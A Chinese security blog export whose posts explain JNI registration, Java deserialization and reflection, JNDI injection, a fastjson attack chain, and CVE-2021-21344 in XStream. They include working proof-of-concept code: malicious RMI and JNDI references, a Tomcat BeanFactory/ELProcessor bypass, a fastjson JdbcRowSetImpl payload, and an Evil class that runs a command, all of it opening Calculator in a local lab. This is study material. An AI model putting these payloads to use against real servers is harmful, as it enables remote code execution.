{"pages":[],"posts":[{"title":"JNI 101","text":"本章参考： 《深入理解Android 卷Ⅰ》 在逆向so文件时，我们经常遇到/发现： 找不到Java层native函数对应的JNI函数； 要把JNI函数的第一个参数改为JNIEnv *env以便识别； 加载so时，频繁调用NewStringUTF、ReleaseStringUTFChars等字符串函数。 在深入理解JNI (Java Native Interface) 之后，我们可以解释上述现象。 JNI函数注册，即将Java层的native函数与其对应的JNI函数关联起来，以实现在Java层调用JNI函数。有两种注册方式，静态注册与动态注册。 首先，我们来看较为简单的静态注册。创建一个类Static，其中加载了名为jni的库，并调用了JNI函数output： 123456789package com.example.jni;public class Static { static { System.loadLibrary(&quot;jni&quot;); } public static native String output();} 使用javac编译，并用javah生成对应的JNI头文件com_example_jni_Static.h： 在该文件中，我们可以看到它声明了native函数output。无参函数output，此时拥有了两个参数JNIEnv和jclass。第一个参数JNIEnv，代表着当前的JNI环境；第二个参数代表当前类，若native函数为static，参数为jclass，其他为jobject。 接着，在com_example_jni_Static.c中实现该函数： 123456#include &lt;jni.h&gt;#include &lt;string.h&gt;jstring Java_com_example_jni_Static_output(JNIEnv *env,jclass type){ return (*env)-&gt;NewStringUTF(env, &quot;You called the static-register method.&quot;);} 使用ndk-build生成libjni.so： 此时，使用IDA分析libjni.so，我们可以轻而易举地定位output函数： 其构成为：Java_包名_函数名。需要注意，包名中的.，都被转换为_，另外，如果函数名中含_，将被转换为l_。 于是，在静态注册中，当Java层调用output函数时，会在对应的JNI库中寻找Java_com_example_jni_Static_output来建立关联关系。而实际上，这种方式会影响运行效率，同时被逆向的风险较大。 那么我们来看动态注册。首先介绍一下JNINativeMethod： 12345typedef struct { char *name; // Java层native函数名 char *signature; // 函数签名 void *fnPtr; // JNI层函数指针} JNINativeMethod; 动态注册，便是使用这样一个结构体来存储Java层函数与JNI指针的对应关系，以克服效率上的弊端。 创建一个类Dynamic： 123456789package com.example.jni2;public class Dynamic { static { System.loadLibrary(&quot;jni&quot;); } public static native String output();} 编写com_example_jni2_Dynamic.c： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;jni.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;JNIEXPORT jstring JNICALL riddle(JNIEnv *env, jclass type) { return (*env)-&gt;NewStringUTF(env, &quot;You called the dynamic-register method.&quot;);}static JNINativeMethod g_methods[] = { { &quot;output&quot;, &quot;()Ljava/lang/String&quot;, (void *) riddle }};JNIEXPORT int JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) { JNIEnv *env; if ((*vm)-&gt;GetEnv(vm, (void **)&amp;env,JNI_VERSION_1_6) != JNI_OK) { return JNI_FALSE; } const char *class_path = &quot;com/example/jni2/Dynamic&quot;; jclass javaClass = (*env)-&gt;FindClass(env,class_path); if (javaClass == NULL) { return JNI_FALSE; } int method_count = sizeof(g_methods) / sizeof(g_methods[0]); if ((*env)-&gt;RegisterNatives(env,javaClass, g_methods, method_count) &lt; 0) { return JNI_FALSE; } return JNI_VERSION_1_6;} 代码的前半部分，包括riddle函数的实现和元素为JNINativeMethod的动态注册表g_methods。先来看JNINativeMethod，函数名为output，函数签名为()Ljava/lang/String，JNI层指针为riddle。其中，函数签名的格式为(参数1类型;参数2类型...;)返回值类型，我们可以使用javap工具快捷生成函数签名。 可知，output函数对应的JNI函数为riddle。正如IDA中看到的一样： 非开发者逆向时，自然难以得知output与riddle相关联，可见动态注册变相增加了逆向的难度。 那在对抗动态注册时，如何定位native函数的实现呢？我们结合上文JNI_OnLoad的源码来进行分析。在Java层通过System.loadLibrary加载完so库后，会调用JNI_OnLoad函数，这是唯一有机会进行动态注册的地方。 IDA中的JNI_OnLoad函数初始如下： 修改JNIEnv参数： 可以看到动态注册函数RegisterNatives得到还原。对照源码可知，其第三个参数为动态注册表g_methods。来到off_26B0处： 发现动态注册表，成功定位output函数。 最后，我们再来解释一下开头提出的现象3。我们在Java层调用output函数： 12345678910public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); String test = Static.output(); Toast.makeText(getApplicationContext(), test, Toast.LENGTH_SHORT).show(); }} 使App在创建时弹出output返回的字符串，效果如下： 使用JNITrace跟踪libjni.so的加载情况： 可见，JNIEnv对我们输入的字符串调用了NewStringUTF生成了jstring对象。JNI层中，正式借助此类函数对jstring对象，即Java层的String对象，进行操作。在实际开发时，进行此类操作后，需要调用ReleaseStringUTFChars释放资源，以防JVM内存泄漏。","link":"/2022/03/02/JNI-101/"},{"title":"JavaSec系列 - 1. 反序列化与反射","text":"本章源码： https://github.com/hey3e/JavaSec-Code/tree/main/javasec1 （1）序列化与反序列化在Java中，我们创建的对象会随着其JVM的销毁而销毁。但有时，我们希望能在其他JVM、或是其他机器上复用这个对象。序列化允许我们将Java对象转换为字节流，便于存储到本地，以及通过网络发送给其他机器。而反序列化允许我们重新将序列化的字节流还原为Java对象。 我们首先来看一下序列化的实现： 123456String string1 = &quot;test&quot;;FileOutputStream fileOutputStream = new FileOutputStream(&quot;test.db&quot;);ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);objectOutputStream.writeObject(string1);objectOutputStream.close(); 这段代码中，通过调用ObjectOutputStream类的writeObject方法，我们序列化了”test”字符串对象，并将其字节流存储到本地： 1aced 0005 7400 0474 6573 74 其中，aced 0005是序列化数据的特征。 再来看一下反序列化的实现： 12345FileInputStream fileInputStream = new FileInputStream(&quot;test.db&quot;);ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);String string2 = (String) objectInputStream.readObject();System.out.println(string2);objectInputStream.close(); 这段代码调用ObjectInputStream类的readObject方法实现反序列化，恢复了”test”字符串对象。 （2）反射反射是指程序在运行过程中动态地去获取指定对象。 对于打开计算器的代码： 1Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); 用反射实现为： 1234Class clz = Class.forName(&quot;java.lang.Runtime&quot;);Method getRuntime = clz.getMethod(&quot;getRuntime&quot;);Runtime runtime = (Runtime) getRuntime.invoke(clz);clz.getMethod(&quot;exec&quot;, String.class).invoke(runtime, &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); 其中，forName用于获取类，getMethod和invoke分别用于获取和执行方法。 这里我们重点讨论一下forName方法。构造这样一个类： 1234567891011package javasec1;public class ReflectionClass { static { System.out.println(&quot;[+] Static Constructor Method.&quot;); } public ReflectionClass() { System.out.println(&quot;[+] Constructor Method.&quot;); }} 它包含一个静态初始化块static{}和一个构造方法。其中，static{}会在类加载时执行，构造方法会在类初始化时执行。 我们调用forName来获取它： 1Class clz = Class.forName(&quot;javasec1.ReflectionClass&quot;); 运行这单行代码，发现static{}被执行： 可以得知，forName查找并加载了类，但未初始化。初始化调用newInstance方法即可： 12Class clz = Class.forName(&quot;javasec1.ReflectionClass&quot;);clz.newInstance(); （3）反序列化利用反序列化的利用实际上与反射息息相关。我们来看这样两段代码：（两段代码此处需要分开运行，后面会给出解释） 123456ReflectionClass reflectionClass = new ReflectionClass();FileOutputStream fileOutputStream = new FileOutputStream(&quot;util.db&quot;);ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);objectOutputStream.writeObject(reflectionClass);objectOutputStream.close(); 1234FileInputStream fileInputStream = new FileInputStream(&quot;util.db&quot;);ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);ReflectionClass object = (ReflectionClass) objectInputStream.readObject();objectInputStream.close(); 很明显，两段代码分别对前文构造的ReflectionClass类进行了序列化与反序列化的操作。执行第一段代码，发现报错： 这是因为现在的ReflectionClass类缺乏序列化的必要条件：实现Serializable接口。于是对ReflectionClass进行修改，使其实现Serializable接口： 12345678910111213package javasec1;import java.io.Serializable;public class ReflectionClass implements Serializable { static { System.out.println(&quot;[+] Static Constructor Method.&quot;); } public ReflectionClass() { System.out.println(&quot;[+] Constructor Method.&quot;); }} 序列化成功后，我们执行第二段代码进行反序列化： 发现static{}被执行了。据此，我们推测：readObject方法中调用了forName或其他能够加载类的方法。 于是，我们跟进readObject，果然，ObjectInputStream类的resolveClass方法调用了forName，返回了ReflectionClass类： 具体调用栈如下： 但是，此处的forName执行完后，程序并没有打印”[+] Static Constructor Method.”： 回看刚刚的forName调用，我们发现这里其第二个参数initialize是false： 而我们在反射一节执行的Class clz = Class.forName(&quot;javasec1.ReflectionClass&quot;);，实际上默认设置initialize为true： 可知，initialize的trueorfalse，决定了在forName找到目标类后，是否进行加载。 因此，ObjectInputStream类的readObject方法调用了forName得证，即反射确确实实存在于反序列化过程中。但由于initialize设置为false，static{}没有在此处执行。 那么问题来了，static{}在哪里执行的呢？ 继续跟进，最终，在ObjectStreamClass类的computeDefaultSUID方法中，找到了一个用于检查类是否有静态初始化的方法hasStaticInitializer： 就是这个方法，触发了static{}中代码的执行： 具体调用栈如下： 问题解决，现在来解释为什么刚才的序列化与反序列化操作需要分开进行。我们合起来运行看下效果： 合起来后，首先执行ReflectionClass reflectionClass = new ReflectionClass();，对类进行了加载和初始化，因此有了图中的两行输出。但按照前文对反序列化的分析来看，理应还有一行”[+] Static Constructor Method.”。 我们debug合起来的代码，发现在ObjectStreamClass类的getSerialVersionUID方法中，对类的suid是否为null进行了判断，而此时的suid并不为null，因此没能进入到doPrivileged方法中，也就没有了先前对hasStaticInitializer的调用，没有了对静态初始化的检查，也就不会打印”[+] Static Constructor Method.”。 那么，分开运行时反序列化过程中的suid应该为null才对。我们回头验证一下： 正确。 要理解其中的原因，我们首先要认识一下suid，它是JVM分发给每个可序列化类的一串数字。于是，合起来运行时，第一段代码中对ReflectionClass的初始化使得JVM“认识”了它，有了其suid的记录。而分开运行的第二段代码中，ReflectionClass对于JVM，是一个全新的存在，因此JVM会为其新生成一个suid，这个过程中，触发了类的静态初始化。 值得注意的是，分开运行生成的suid与一起运行的一致，这也体现了suid本身的目的：验证对象的唯一性。 至此，static{}在何处被执行以及序列化与反序列化过程共同、分别运行的差别，均已解释完毕，我们可以继续向下跟进。 ObjectInputStream类的readSerialData方法通过调用hasReadObjectMethod()，检查类是否重写了readObject方法，如果没有，则执行默认方法，即defaultReadFields： 我们尝试在类中重写readObject方法： 123456789101112131415161718package javasec1;import java.io.IOException;import java.io.Serializable;public class ReflectionClass implements Serializable { static { System.out.println(&quot;[+] Static Constructor Method.&quot;); } public ReflectionClass() { System.out.println(&quot;[+] Constructor Method.&quot;); } private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { System.out.println(&quot;[+] My readObject.&quot;); }} 这里我们可以把序列化和反序列化一起运行了，结果如下： 可见重写的readObject方法被执行。再次跟进到ObjectInputStream类的readSerialData方法，发现程序进入了if分支，调用invokeReadObject方法通过反射invoke了我们重写的readObject方法。 本节输出了反射、类的静态初始化和类重写readObject方法三者在反序列化过程中的利用。至于恶意利用，你可以构造一个恶意类，尝试将反射一节开头展示的计算器代码分别写在static{}和readObject中，随后对其进行序列化与反序列化，查看效果。","link":"/2021/12/22/JavaSec%E7%B3%BB%E5%88%97-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%B0%84/"},{"title":"JavaSec系列 - 2. JNDI注入","text":"本章源码： https://github.com/hey3e/JavaSec-Code/tree/main/javasec2 命名与目录系统 (Naming and Directory services)，如RMI (Remote Method Invocation)、LDAP (Lightweight Directory Access Protocol) 等，能够以类似字典key-value的name-object形式对对象进行存储，使得我们可以通过名称来查询并访问对象。JNDI (Java Naming and Directory Interface) 便是该过程的接口。 结合上一章的知识，我们考虑在系统中存储对象序列化后的字节流，当用户进行查询时，系统返回对应的字节流，用户再进行反序列化获取对象。但在实际场景中，如果对象过大，采用该方式往往会给系统带来一定的负担。 于是，JNDI使用Naming References的方式进行存储，此时，name-object中的object并非对象本身，而是对象的引用Reference，其中包含对象名及其真正被存放的地址codebase。当用户进行查询时，系统返回Reference，用户解析后再从codebase获取对象。不过这里说的不太严谨，后面会进行补充。 不过，上述从远程codebase加载对象的方式存在许多安全问题，随着jdk版本的迭代，系统对codebase已逐渐不再信任，JNDI受到越来越多的限制。我们下面看一下各版本下JNDI如何实现。 （1）jdk&lt;8u121 (RMI+JNDI)首先，构造要查询的目标类TargetClass： 123456789public class TargetClass { static { System.out.println(&quot;[+] Server Static Constructor Method.&quot;); } public TargetClass() { System.out.println(&quot;[+] Server Constructor Method.&quot;); }} javac编译，并挂到python的简易服务器上： 下面编写RMI服务器的代码： 1234567891011121314public class RMIServer { public static void main(String[] args) throws Exception{ //a Registry registry = LocateRegistry.createRegistry(1099); //b String FactoryURL = &quot;http://127.0.0.1:4444/&quot;; Reference reference = new Reference(&quot;ReferenceClass&quot;,&quot;TargetClass&quot;, FactoryURL); ReferenceWrapper wrapper = new ReferenceWrapper(reference); //c registry.bind(&quot;Target&quot;, wrapper); }} 其中： a处，创建RMI服务，监听1099端口。 b处，构造Reference，codebase为前文的python服务器，对象为TargetClass类。 c处，进行存储，name为Target，object为Reference。 接下来，编写Client查询代码： 123456public class RMIClient { public static void main(String[] args) throws Exception{ Context ctx = new InitialContext(); ctx.lookup(&quot;rmi://127.0.0.1:1099/Target&quot;); }} 注意，Client与TargetClass需要在不同的project中，后面会同本文开头的“不严谨”一起给出解释。这里我们使用InitialContext类的lookup方法向RMI系统进行查询。 运行Server后运行Client，发现TargetClass类的两段代码都被执行，同时服务器收到了一条GET请求： 开始跟进lookup。InitialContext类的lookup方法首先调用了getURLOrDefaultInitCtx获取到基于URL scheme的Context，此处是基于rmi的RegistryContext： 继续调用两个lookup后，来到RegistryContext类的decodeObject方法，此时Client已经获取到了目标对象的Reference： 接着，在NamingManager类的getObjectInstance方法中，对Reference进行了处理，传入getObjectFactoryFromReference方法： 此处处理后的Reference如下，与RMI系统中设置的一致： 其中，className为自定的类名，classFactory为目标类名，classFactoryLocation为codebase。 在getObjectFactoryFromReference方法中，程序分别尝试了从本地和codebase两处加载TargetClass： 最终，程序选择了codebase的loadClass，并在其中调用了我们熟悉的forName： 不仅如此，getObjectFactoryFromReference还调用了newInstance方法完成了对TargetClass的初始化，至此，RMI上的JNDI完成： 在jdk&gt;8u121的环境下使用上述RMI+JNDI时，我们发现Client报错： 可见高版本RMI默认已不信任codebase。为绕过该限制，我们可以转向LDAP+JNDI。 （2）jdk&lt;8u191 (LDAP+JNDI)这里，我们方便的用marshalsec启动一个LDAP服务器： 修改Client代码中的URL scheme为ldap，端口为1389: 123456public class RMIClient { public static void main(String[] args) throws Exception{ Context ctx = new InitialContext(); ctx.lookup(&quot;ldap://127.0.0.1:1389/Target&quot;); }} 运行，成功加载并初始化TargetClass，LDAP上的JNDI完成： 跟进lookup方法，流程与RMI类似。 （3）JNDI注入同样，marshalsec也可以启动RMI服务器： 其中，JRMP (Java Remote Method Protocol) 远程方法协议，是用于RMI过程中的协议。 运行Client，可以得到与前文同样的结果。 marshalsec与我们自己编写的RMI服务器之间的不同之处在于，如果你向我们编写的RMI服务器查询一个不存在的对象Foo： 1ctx.lookup(&quot;rmi://127.0.0.1:1097/Foo&quot;); 程序会报NameNotFound错误： 这是因为我们的RMI服务器上并未存储名为Foo的Reference。 若向marshalsec的RMI服务器查询，成功： 这是因为marshalsec实际上是利用socket自定义了一个RMI服务器，当收到rmi的lookup请求时，服务器会调用handleRMI方法进行处理： 其中，我们提供的参数 http://127.0.0.1:4444/#TargetClass 会被直接包装成Reference返回。即无论Client查询谁，服务器返回的都是我们设计的Reference。因此JNDI一定成功。 marshalsec的LDAP服务器同理，当收到ldap的lookup请求时，调用sendResult方法，返回我们设计的Reference： 上面所讲均是JNDI的使用。试想如果我们能够控制目标lookup方法的参数，使其向由我们启动的服务器发起查询，以返回一个指定的恶意Reference，就可以达到远程代码执行的效果。这类攻击就叫做JNDI注入。 下面是来自 https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf 的两类JNDI注入示意图： （4）jdk&gt;8u191在jdk8u191+的环境中，LDAP默认也已不再信任codebase。至此，已难以通过远程加载codebase的方式实现JNDI注入。 下面我们先来填一下前文“不严谨”和“不同project”的坑。 我们切回到jdk&lt;8u121的环境下，并在Client的目录下也构造一个TargetClass，使其实现ObjectFactory接口和getObjectInstance方法： 12345678910111213141516171819import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.util.Hashtable;public class TargetClass implements ObjectFactory { static { System.out.println(&quot;[+] Client's Static Constructor Method.&quot;); } public TargetClass() { System.out.println(&quot;[+] Client's Constructor Method.&quot;); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception { return null; }} 还有一点不同，这里我们打印的是”Client…”，而codebase下的TargetClass打印的是”Server…”。 复现RMI+JNDI，查看结果： 可知Client这次拿到的是本地的TargetClass。跟进，再次来到getObjectFactoryFromReference方法，发现这次程序选择了从本地进行加载： 于是，我们可以补充一下文章开头的JNDI知识点：当用户进行查询时，系统返回Reference，用户会先在本地ClassPath中查找该对象，若没有，再去codebase处获取。 综上，我们考虑：既然高版本jdk限制了从codebase获取类，我们就尝试通过利用本地ClassPath中已有的类来实现JNDI注入。 首先，这个类需要实现了ObjectFactory接口和getObjectInstance方法，在Apache Tomcat中，我们找到了符合条件的org.apache.naming.factory.BeanFactory类： 回头debug本地类的JNDI，我们看到该类实现的getObjectInstance方法会被调用： 于是我们下面来看org.apache.naming.factory.BeanFactory类的getObjectInstance方法有什么值得利用的地方。 可见，它会处理ResourceRef类的Reference，加载并初始化名为Reference中className字段的类。由此我们得知，className指定的类必须本地存在且有无参构造方法。 继续向下： 这一段，我们了解到方法获取Reference中”forceString”属性的值并用’=’进行分隔，等号左边成为哈希表forced的一个key，其value是className指定的类中名为等号右边的方法。如”forceString”为”x=y”，则”x”将存为key，value为y方法。注意，此方法的参数paramTypes为一个String类型，所以我们要找的className指定的类中需要有这样一个方法。 继续向下： 这里，方法遍历Reference的所有属性，对type不为if中指定的值的属性，获取其content，并利用反射invoke了className类中名为type在forced中对应的value的方法，且参数为content。沿续上文的举例，若在Reference中添加type为”x”的属性，则y方法最终将被反射调用。 综上所述，可见如果我们能找到一个符合要求的className类并精心构造一个Reference，通过Client从本地加载org.apache.naming.factory.BeanFactory类并执行getObjectInstance方法，有希望借助反射实现JNDI注入。 最终，我们找到了javax.el.ELProcessor类，它满足我们之前提出的要求： 存在于Tomcat依赖包中。 有无参构造方法。 有eval方法，其参数为一个String类型。 同时，在设计Reference时，我们需要注意，在jdk8u121+的环境中，是这样检查的codebase的信任问题的： 在RegistryContext类的decodeObject方法中，对trustURLCodebase的trueorfalse进行了检查。观察判断条件，我们可以通过设置Reference的factoryLocation，也就是codebase，为null的方式进行绕过，从而成功进入getObjectInstance方法。 接下来，根据已上思路，我们编写RMI服务器来返回恶意Reference： 12345678910111213public class RMIServer191 { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1097); ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null); ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;)); ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).&quot; + &quot;newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).&quot; + &quot;eval(\\&quot;java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\\&quot;)&quot;)); ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref); registry.bind(&quot;Object&quot;, referenceWrapper); }} 其中，”x”属性的content，作为参数传入eval方法后，会被解析成EL表达式从而达到命令执行的效果。 运行Client，弹出计算器，JNDI注入成功： 跟进lookup，可以对org.apache.naming.factory.BeanFactory类的getObjectInstance方法是如何处理Reference的有一个更深的理解。 至此，我们了解了不同环境下JNDI注入的绕过与实现： jdk&lt;8u121：RMI+codebase。 jdk&lt;8u191：LDAP+codebase。 jdk&gt;8u191：BeanFactory+本地ClassPath。","link":"/2021/12/29/JavaSec%E7%B3%BB%E5%88%97-2-JNDI%E6%B3%A8%E5%85%A5/"},{"title":"JavaSec系列 - 3. 反序列化与JNDI注入(1)","text":"本章源码： https://github.com/hey3e/JavaSec-Code/tree/main/javasec3 上章我们了解到，通过控制lookup方法的参数，可以实现JNDI注入。从控制到注入，就是一条完整的攻击链。我们来看一个实例。 首先，我们需要一个注入点。在java.lang中，我们找到了类com.sun.rowset.JdbcRowSetImpl，其connect方法对dataSource属性作lookup： 回溯，发现该类的setter方法setAutoCommit调用了connect： 类的getter和setter分别用于外界对类的private属性进行访问和更新。而从外界调用类内方法的手段，我们首先想到了反射，和处处用到反射的反序列化。 因此攻击链的挖掘思路就很清晰了：寻找反序列化操作，使其反射构造恶意的JdbcRowSetImpl对象并调用setAutoCommit，从而实现JNDI注入。 我们了解到，JSON解析库fastjson在将JSON字符串还原为Java对象的过程中会调用其getter和setter方法。我们来看一下。 构造一个Person类，包含getAge和setAge方法： 1234567891011121314151617181920package javasec3;public class Person { private Integer age; public Person(Integer age) { this.age = age; } public Person() { } public void setAge(Integer age) { this.age = age; } public Integer getAge() { return age; }} 编写fastjson代码： 123456789public class test { public static void main(String[] args) { Person person = new Person(18); String json = JSON.toJSONString(person); System.out.println(json); JSONObject jsonObject = JSON.parseObject(json); System.out.println(jsonObject); }} 其中使用JSON.toJSONString和JSON.parseObject进行序列化与反序列化。结果如下： 并无特别之处，同时我们debug发现JSON.parseObject并没有调用Person类的getter和setter方法。这是因为我们没有实现“自省”功能：SerializerFeature.WriteClassName，修改下行代码： 1String json = JSON.toJSONString(person, SerializerFeature.WriteClassName); 再次查看结果： 可以看到序列化后的字符串中新增了@type字段标明了类型信息。再次跟进，发现如期调用了setAge和getAge： 也就是说，对于指明@type的输入，fastjson会调用getter和setter方法。 至此，我们得知要构造的恶意JSON payload中需要包含： 123{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;} 再次回到JdbcRowSetImpl类的setAutoCommit方法，其调用的connect方法会对dataSource属性作lookup，因此，我们在payload中新增一个dataSource字段，值为我们启动的RMI/LDAP服务器。同时，既然要进入setAutoCommit，payload中就必须有autoCommit： 12345{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://localhost:1097/Evil&quot;, &quot;autoCommit&quot;:true} payload准备就绪。接下来用SpringBoot启动一个web服务，在index页面对传入的JSON字符串作反序列化： 123456789@Controllerpublic class Index { @RequestMapping(value = &quot;/index&quot;, method = RequestMethod.POST) @ResponseBody public JSONObject test(@RequestBody String data) { JSONObject ret = JSONObject.parseObject(data); return ret; }} 编写恶意类，编译后挂载： 1234567891011121314import java.io.Serializable;public class Evil implements Serializable { static { try { Runtime rt = Runtime.getRuntime(); String[] cmd = {&quot;exec&quot;, &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}; Process pc = rt.exec(cmd); pc.waitFor(); } catch (Exception e) { } }} 用marshalsec启动一个RMI服务器，返回指向Evil类的恶意Reference： 最后，POST payload，计算器弹出： 在lookup处下断点，调用栈如下： 可见在反序列化过程中，利用反射invoke了类的setter方法。 需要注意的是，上述攻击需要fastjson&lt;=1.2.24。在后续的版本中，fastjson加入了checkAutoType方法和黑名单对输入进行过滤，但也不断被绕过。大部分绕过的原理，都是基于本文所述的反序列化+JNDI注入。","link":"/2022/01/17/JavaSec%E7%B3%BB%E5%88%97-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5-1/"},{"title":"JavaSec系列 - 4. 反序列化与JNDI注入(2)","text":"本章源码： https://github.com/hey3e/JavaSec-Code/tree/main/javasec4 深入分析CVE-2021-21344。 上章，我们以fastjson的JSON.parseObject为反序列化入口，JdbcRowSetImpl类的lookup方法为JNDI注入点，实现了一次完整的攻击。 类似，XML解析库XStream使用toXML和fromXML方法对Java对象进行序列化与反序列化，我们来看下它如何成为攻击的触发点。 首先了解一下基本原理。用下列代码处理上章的Person类： 1234567891011121314package javasec4;import com.thoughtworks.xstream.XStream;public class test { public static void main(String[] args) { XStream xStream = new XStream(); Person person = new Person(18); String xml = xStream.toXML(person); System.out.println(xml); xStream.fromXML(xml); }} 序列化后的XML为： 123&lt;javasec4.Person&gt; &lt;age&gt;18&lt;/age&gt;&lt;/javasec4.Person&gt; 接下来我们对Person类稍作处理，使其实现Serializable接口并重写readObject方法： 123456789101112131415161718192021222324252627package javasec4;import java.io.IOException;import java.io.Serializable;public class Person implements Serializable{ private Integer age; public Person(Integer age) { this.age = age; } public Person() { } public void setAge(Integer age) { this.age = age; } public Integer getAge() { return age; } public void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { System.out.println(&quot;[+] Person's readObject.&quot;); }} 此时序列化后的XML为： 可以注意到两点，对于实现了Serializable接口并重写了readObject方法的类，其序列化后的XML会新增serialization=&quot;custom&quot;字段，同时，类似于fastjson反序列化过程中类的getter和setter方法会得到执行，XML反序列化过程中，类重写的readObject会被执行。 记住这些，我们分层来分析CVE-2021-21344的POC： 最外层，是java.util.PriorityQueu类，一个借助其comparator进行排序的优先级队列。可知它实现了Serializable接口并重写了readObject方法。&lt;default&gt;标签下，是该类的两个属性size和comparator。最下面的便是队列中的两个字符串元素”javax.xml.ws.binding.attachments.inbound”。 为了更好的理解，我们可以自己定义这样一个队列并对其序列化： 1234567891011public class test { public static void main(String[] args) { XStream xStream = new XStream(); PriorityQueue&lt;String&gt; priorityQueue = new PriorityQueue(); priorityQueue.add(&quot;javax.xml.ws.binding.attachments.inbound&quot;); priorityQueue.add(&quot;javax.xml.ws.binding.attachments.inbound&quot;); System.out.println(priorityQueue); String xml = xStream.toXML(priorityQueue); System.out.println(xml); }} 查看结果： 除comparator外，完全一致。 接下来重点看下comparator部分： 层层嵌套，我们用debug的方式来理解。 在PriorityQueue的readObject方法上下断点，发现它被如期调用： 对PriorityQueue而言，一个序列化后的队列字符串，反序列化要做的就是重新排序，对应readObject的heapify方法： 排序的标准便是前文提及的comparator，此处为sun.awt.datatransfer.DataTransferer$IndexOrderComparator类，常用于应用间通信。其compare方法，排序的对象便是两个”javax.xml.ws.binding.attachments.inbound”字符串： 同时，可见排序传入了DataTransferer$IndexOrderComparator类的indexMap，此处为com.sun.xml.internal.ws.client.ResponseContext类，顾名思义，它是通信中response报文的信息。在该comparator中，对两个元素的比较是通过比较二者在indexMap中的索引来实现的。在compareIndices方法中，调用get获取了元素的索引： 深入get，首先映入眼帘的便是基于报文主体packet的多次判断： 我们贴下POC中构造的&lt;packet&gt;部分进行对照： 第一个if，进入到supports： 对照POC，并无satellites，可以理解为并没有集成其他报文的属性。同理，也无else if中的handlerScopePropertyNames，因此进入else部分。这里的判断if (!key.equals(&quot;javax.xml.ws.binding.attachments.inbound&quot;))表明了为什么PriorityQueu中的元素需要是”javax.xml.ws.binding.attachments.inbound”，而inbound message，实际上指来自移动设备的消息。于是来到最后的else： 其中，对packet的message，此处为com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart，一个MIME类型的XML，进行了剖析。接下来，我们把注意力集中到message上，POC部分如下： 来到XMLMessage$XMLMultiPart的getMessage方法： 可见，getMessage最终需要delegate，而POC中并未构造，因此会借助dataSource来进行生成。这里的dataSource为com.sun.xml.internal.ws.message.JAXBAttachment，POC中可以看到，它有两个属性，bridge和jaxbObject。此处具体的生成逻辑为，利用dataSource提供的序列化操作，即JAXBAttachment的bridge，将dataSource的主体，即JAXBAttachment的jaxbObject，转化为字节流，传入MimeMultipartParser进行处理，以生成delegate并返回。 对照POC，我们看到这里的jaxbObject是上章用到过的JdbcRowSetImpl类，它的详细构造我们等下来看。这里，我们先保持思路跟进封装了一系列序列化操作的bridge，此处为com.sun.xml.internal.ws.db.glassfish.BridgeWrapper的com.sun.xml.internal.bind.v2.runtime.BridgeImpl类： 来到序列化方法marshal： 可见，该方法首先利用context的marshallerPool构造了一个Marshaller。于是我们跟进到POC的&lt;context&gt;： 可以发现&lt;context&gt;中&lt;nameList&gt;提供的两个属性均为空，这是因为其内容并不会影响到攻击的主逻辑，但是是必须的，如果没有则会报错。这里我展示了二者分别是在何处被访问到的： &lt;namespaceURIs&gt;： &lt;localNames&gt;： 分析完context，我们继续看序列化操作： 其中，t为JdbcRowSetImpl类，m为刚刚构造的Marshaller，而bi，此处为com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl，继承自com.sun.xml.internal.bind.v2.runtime.JaxBeanInfo，封装了具体到某一类的序列化操作。看下POC： 向下跟进，来到XMLSerializer类的childAsXsiType方法： 其中，比较完&lt;jaxbType&gt;与child，即JdbcRowSetImpl，的异同后，调用了actual，即POC中构造的bi：ClassBeanInfoImpl，的serializeURIs方法对JdbcRowSetImpl进行序列化： 这里我们看到&lt;uriProperties&gt;是不可或缺的。接着，调用了inheritedAttWildcard的get方法，此处为com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection，顾名思义，用于反射访问类的getter和setter。而这里的get，反射调用了JdbcRowSetImpl的getter方法： 上章，攻击借助了JdbcRowSetImpl的setAutoCommit方法，而实际上，它的一个getter方法，getDatabaseMetaData，也调用了connect，也就是我们在POC中所声明的。因此至此，我们已经从XStream反序列化的入口，挖掘到了JNDI注入点，整体的调用栈如下： 最后我们回头填前文&lt;jaxbObject&gt;的坑： 有了上章的经验，dataSource一目了然，攻击的最后一环也就绪了。 